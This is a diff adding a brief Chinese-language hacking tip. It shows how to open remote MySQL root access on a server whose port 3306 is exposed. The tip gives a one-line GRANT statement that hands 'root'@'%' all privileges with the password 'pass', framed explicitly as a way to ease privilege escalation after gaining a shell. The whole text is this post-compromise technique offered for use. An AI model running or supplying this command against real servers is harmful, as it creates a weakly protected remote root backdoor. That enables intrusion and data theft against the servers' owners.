@@ -1,0 +1,4 @@
+一句话开启mysql root外连
+如果遇到了 服务器开启了 3306 端口，但是不允许root外连的情况，我们可以在shell里面执行如下的语句来开启root用户的外连，方便我们提权。
+
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'pass' WITH GRANT OPTION; 
